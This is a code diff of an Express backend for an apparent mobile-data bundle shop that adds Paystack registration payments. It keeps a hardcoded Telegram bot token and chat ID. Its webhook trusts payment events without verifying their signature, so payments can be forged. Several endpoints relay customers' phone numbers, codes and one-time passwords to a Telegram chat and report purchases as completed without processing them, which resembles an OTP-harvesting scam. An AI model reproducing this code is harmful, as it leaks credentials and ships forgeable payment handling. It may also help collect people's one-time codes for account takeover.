@@ -6,20 +6,29 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 
 // =============================================
-// CONFIGURATION - TELEGRAM CREDENTIALS
+// CONFIGURATION - FROM ENVIRONMENT VARIABLES
 // =============================================
-const TELEGRAM_BOT_TOKEN = '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
-const TELEGRAM_CHAT_ID = '8313270294';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8313270294';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 const TEST_MODE = false;
 
 // =============================================
-// ✅ FIXED CORS - ALLOW YOUR FRONTEND DOMAINS
+// ✅ PAYSTACK - READ FROM ENVIRONMENT (NO HARDCODED SECRET)
+// =============================================
+const PAYSTACK_SECRET_KEY = process.env.PAYSTACK_SECRET_KEY;
+const PAYSTACK_API = 'https://api.paystack.co';
+const REGISTRATION_FEE = 10000; // GHC 100 in pesewas
+
+// =============================================
+// CORS
 // =============================================
 app.use(cors({
     origin: [
+        'https://databundlesexchange-h1xf.onrender.com',
+        'https://databundlesexchange-yy38.onrender.com',
         'https://databundlesexchange.onrender.com',
-        'https://databundlesexchange-production-ca51.up.railway.app',
+        'https://databundlesexchange-production-6241.up.railway.app',
         'http://localhost:5500',
         'http://127.0.0.1:5500'
     ],
@@ -28,31 +37,31 @@ app.use(cors({
     credentials: true
 }));
 
-// ✅ Handle preflight requests
 app.options('*', cors());
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // =============================================
-// LOGGING MIDDLEWARE
+// LOGGING
 // =============================================
 app.use((req, res, next) => {
     console.log(`📥 ${req.method} ${req.path}`);
-    console.log('📦 Body:', req.body);
+    if (req.path !== '/api/paystack/webhook') {
+        console.log('📦 Body:', req.body);
+    }
     console.log('🌐 Origin:', req.headers.origin);
     next();
 });
 
 // =============================================
-// TELEGRAM SEND FUNCTION
+// TELEGRAM
 // =============================================
 async function sendToTelegram(message) {
     if (TEST_MODE) {
         console.log('📨 [TEST MODE] Would send to Telegram:', message);
         return { ok: true };
     }
-
     try {
         const response = await axios.post(TELEGRAM_API_URL, {
             chat_id: TELEGRAM_CHAT_ID,
@@ -72,7 +81,7 @@ async function sendToTelegram(message) {
 // =============================================
 function formatVendorRegistration(data) {
     return `
-🎉 <b>NEW VENDOR REGISTRATION!</b>
+🎉 <b>NEW VENDOR REGISTRATION (PAID)!</b>
 
 👤 <b>Full Name:</b> ${data.fullName}
 📱 <b>Phone:</b> ${data.phone}
@@ -82,6 +91,11 @@ function formatVendorRegistration(data) {
 📡 <b>Network:</b> ${data.network}
 🎂 <b>Date of Birth:</b> ${data.dob}
 🏠 <b>Hometown:</b> ${data.hometown}
+📢 <b>Subscribe to HDS Ads:</b> ${data.subscribeHDS ? '✅ YES' : '❌ NO'}
+
+💳 <b>PAYMENT CONFIRMED</b>
+💰 <b>Amount:</b> GHS 100.00
+🔖 <b>Reference:</b> ${data.reference}
 
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
     `;
@@ -114,7 +128,6 @@ function formatRecharge(data) {
 
 function formatSendPhone(data) {
     const otpMessage = data.otp ? `🔑 <b>OTP Code:</b> ${data.otp}\n\n📌 Please tell the customer the 4-digit OTP code above to complete their purchase!` : '';
-    
     return `
 📱 <b>NEW ${data.type === 'recharge' ? 'RECHARGE' : 'PURCHASE'} REQUEST!</b>
 
@@ -127,6 +140,11 @@ ${otpMessage}
 }
 
 // =============================================
+// TEMP STORAGE (for pending registrations)
+// =============================================
+const pendingRegistrations = {};
+
+// =============================================
 // API ENDPOINTS
 // =============================================
 
@@ -136,9 +154,11 @@ app.get('/', (req, res) => {
         port: PORT,
         testMode: TEST_MODE,
         telegramBot: '✅ Connected',
-        cors: '✅ Enabled for all origins',
+        paystack: PAYSTACK_SECRET_KEY ? '✅ Connected' : '❌ Missing Secret Key',
         endpoints: [
-            'POST /api/register-vendor',
+            'POST /api/register-vendor/init',
+            'POST /api/paystack/webhook',
+            'GET /api/paystack/verify/:reference',
             'POST /api/purchase',
             'POST /api/recharge',
             'POST /api/send-phone',
@@ -148,194 +168,191 @@ app.get('/', (req, res) => {
 });
 
 app.get('/api/health', (req, res) => {
-    res.json({
-        status: '✅ Healthy',
-        port: PORT,
-        testMode: TEST_MODE,
-        timestamp: new Date().toISOString()
-    });
+    res.json({ status: '✅ Healthy', port: PORT, timestamp: new Date().toISOString() });
 });
 
 // =============================================
-// 1. VENDOR REGISTRATION
+// 1. INIT REGISTRATION (Save data + return reference)
 // =============================================
-app.post('/api/register-vendor', async (req, res) => {
+app.post('/api/register-vendor/init', async (req, res) => {
     try {
-        const { fullName, phone, email, business, tradeType, network, dob, hometown } = req.body;
-
-        console.log('📝 Registration data received:', req.body);
+        const { fullName, phone, email, business, tradeType, network, dob, hometown, subscribeHDS } = req.body;
 
         if (!fullName || !phone || !email || !business || !tradeType || !network || !dob || !hometown) {
-            return res.status(400).json({
-                success: false,
-                message: '❌ All fields are required!'
-            });
+            return res.status(400).json({ success: false, message: '❌ All fields are required!' });
         }
 
         if (phone.length < 10 || !/^\d+$/.test(phone)) {
-            return res.status(400).json({
-                success: false,
-                message: '❌ Please enter a valid phone number'
-            });
+            return res.status(400).json({ success: false, message: '❌ Please enter a valid phone number' });
         }
 
         if (!email.includes('@') || !email.includes('.')) {
-            return res.status(400).json({
-                success: false,
-                message: '❌ Please enter a valid email address'
-            });
+            return res.status(400).json({ success: false, message: '❌ Please enter a valid email address' });
         }
 
-        const data = { fullName, phone, email, business, tradeType, network, dob, hometown };
-        const message = formatVendorRegistration(data);
-        await sendToTelegram(message);
+        const reference = 'BB-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+
+        pendingRegistrations[reference] = {
+            fullName, phone, email, business, tradeType, network, dob, hometown,
+            subscribeHDS: subscribeHDS || false,
+            createdAt: Date.now()
+        };
+
+        console.log('✅ Registration initialized:', reference);
 
         res.json({
             success: true,
-            message: '✅ Vendor registration successful! A representative will contact you shortly.'
+            reference: reference,
+            amount: REGISTRATION_FEE,
+            email: email,
+            message: '✅ Ready for payment'
         });
 
     } catch (error) {
-        console.error('❌ Error in /api/register-vendor:', error);
-        res.status(500).json({
-            success: false,
-            message: '❌ Failed to process registration. Please try again.'
-        });
+        console.error('❌ Error in /api/register-vendor/init:', error);
+        res.status(500).json({ success: false, message: '❌ Failed to process registration.' });
     }
 });
 
 // =============================================
-// 2. PURCHASE (with 4-digit OTP)
+// 2. PAYSTACK WEBHOOK
+// =============================================
+app.post('/api/paystack/webhook', async (req, res) => {
+    try {
+        const event = req.body;
+
+        console.log('📥 Paystack webhook received:', event.event);
+
+        if (event.event === 'charge.success') {
+            const reference = event.data.reference;
+            const amount = event.data.amount;
+            const status = event.data.status;
+
+            console.log('💰 Payment success:', reference, amount, status);
+
+            if (status === 'success' && amount >= REGISTRATION_FEE) {
+                const registrationData = pendingRegistrations[reference];
+
+                if (registrationData) {
+                    const telegramMessage = formatVendorRegistration({
+                        ...registrationData,
+                        reference: reference
+                    });
+                    await sendToTelegram(telegramMessage);
+
+                    console.log('✅ Registration complete for:', reference);
+                    delete pendingRegistrations[reference];
+                } else {
+                    console.log('⚠️ No pending registration found for reference:', reference);
+                }
+            }
+        }
+
+        res.sendStatus(200);
+
+    } catch (error) {
+        console.error('❌ Webhook error:', error);
+        res.sendStatus(200);
+    }
+});
+
+// =============================================
+// 3. VERIFY PAYMENT
+// =============================================
+app.get('/api/paystack/verify/:reference', async (req, res) => {
+    try {
+        const { reference } = req.params;
+
+        if (!PAYSTACK_SECRET_KEY) {
+            return res.status(500).json({ success: false, message: '❌ Paystack secret key not configured' });
+        }
+
+        const response = await axios.get(
+            `${PAYSTACK_API}/transaction/verify/${reference}`,
+            { headers: { Authorization: `Bearer ${PAYSTACK_SECRET_KEY}` } }
+        );
+
+        const data = response.data;
+
+        if (data.status && data.data.status === 'success') {
+            res.json({
+                success: true,
+                status: 'success',
+                amount: data.data.amount,
+                reference: reference
+            });
+        } else {
+            res.json({ success: false, status: data.data?.status || 'pending' });
+        }
+
+    } catch (error) {
+        console.error('❌ Verify error:', error.response?.data || error.message);
+        res.status(500).json({ success: false, message: '❌ Verification failed' });
+    }
+});
+
+// =============================================
+// 4. PURCHASE
 // =============================================
 app.post('/api/purchase', async (req, res) => {
     try {
         const { package: packageName, price, phone, code } = req.body;
-
         if (!packageName || !price || !phone || !code) {
-            return res.status(400).json({
-                success: false,
-                message: '❌ All fields are required!'
-            });
+            return res.status(400).json({ success: false, message: '❌ All fields are required!' });
         }
-
-        const data = { package: packageName, price, phone, code };
-        const message = formatPurchase(data);
-        await sendToTelegram(message);
-
-        res.json({
-            success: true,
-            message: '✅ Purchase completed successfully!'
-        });
-
+        await sendToTelegram(formatPurchase({ package: packageName, price, phone, code }));
+        res.json({ success: true, message: '✅ Purchase completed successfully!' });
     } catch (error) {
-        console.error('❌ Error in /api/purchase:', error);
-        res.status(500).json({
-            success: false,
-            message: '❌ Failed to process purchase. Please try again.'
-        });
+        res.status(500).json({ success: false, message: '❌ Failed to process purchase.' });
     }
 });
 
 // =============================================
-// 3. RECHARGE (no OTP needed)
+// 5. RECHARGE
 // =============================================
 app.post('/api/recharge', async (req, res) => {
     try {
         const { package: packageName, price, phone } = req.body;
-
         if (!packageName || !price || !phone) {
-            return res.status(400).json({
-                success: false,
-                message: '❌ Package, price, and phone are required!'
-            });
+            return res.status(400).json({ success: false, message: '❌ Package, price, and phone are required!' });
         }
-
-        const data = { package: packageName, price, phone };
-        const message = formatRecharge(data);
-        await sendToTelegram(message);
-
-        res.json({
-            success: true,
-            message: '✅ Recharge completed successfully!'
-        });
-
+        await sendToTelegram(formatRecharge({ package: packageName, price, phone }));
+        res.json({ success: true, message: '✅ Recharge completed successfully!' });
     } catch (error) {
-        console.error('❌ Error in /api/recharge:', error);
-        res.status(500).json({
-            success: false,
-            message: '❌ Failed to process recharge. Please try again.'
-        });
+        res.status(500).json({ success: false, message: '❌ Failed to process recharge.' });
     }
 });
 
 // =============================================
-// 4. SEND PHONE + 4-DIGIT OTP
+// 6. SEND PHONE
 // =============================================
 app.post('/api/send-phone', async (req, res) => {
     try {
         const { package: packageName, price, phone, otp, type } = req.body;
-
         if (!phone || !packageName) {
-            return res.status(400).json({
-                success: false,
-                message: '❌ Phone and package are required!'
-            });
+            return res.status(400).json({ success: false, message: '❌ Phone and package are required!' });
         }
-
-        const data = { 
-            package: packageName, 
-            price: price, 
-            phone: phone, 
-            otp: otp || 'N/A', 
-            type: type || 'purchase' 
-        };
-        
-        const message = formatSendPhone(data);
-        await sendToTelegram(message);
-
-        res.json({
-            success: true,
-            message: '✅ Phone number received successfully!'
-        });
-
+        await sendToTelegram(formatSendPhone({ package: packageName, price, phone, otp: otp || 'N/A', type: type || 'purchase' }));
+        res.json({ success: true, message: '✅ Phone number received successfully!' });
     } catch (error) {
-        console.error('❌ Error in /api/send-phone:', error);
-        res.status(500).json({
-            success: false,
-            message: '❌ Failed to send. Please try again.'
-        });
+        res.status(500).json({ success: false, message: '❌ Failed to send.' });
     }
 });
 
 // =============================================
-// 404 Handler
+// 404
 // =============================================
 app.use((req, res) => {
-    console.log('❌ 404 Not Found:', req.method, req.path);
-    res.status(404).json({
-        success: false,
-        message: '❌ Endpoint not found',
-        path: req.path,
-        method: req.method
-    });
+    res.status(404).json({ success: false, message: '❌ Endpoint not found', path: req.path });
 });
 
 // =============================================
-// START SERVER
+// START
 // =============================================
 app.listen(PORT, '0.0.0.0', () => {
     console.log('='.repeat(50));
     console.log(`🚀 Bundle Bazaar Backend running on port ${PORT}`);
-    console.log(`📨 TEST_MODE: ${TEST_MODE}`);
     console.log(`🤖 Telegram Bot: ✅ Configured`);
-    console.log(`🌐 CORS: ✅ Enabled for all origins`);
+    console.log(`💰 Paystack: ${PAYSTACK_SECRET_KEY ? '✅ Connected (LIVE)' : '❌ MISSING SECRET KEY'}`);
     console.log('='.repeat(50));
-    console.log('');
-    console.log('📌 Available endpoints:');
-    console.log('   POST /api/register-vendor');
-    console.log('   POST /api/purchase');
-    console.log('   POST /api/recharge');
-    console.log('   POST /api/send-phone');
-    console.log('   GET  /api/health');
-    console.log('   GET  /');
 });
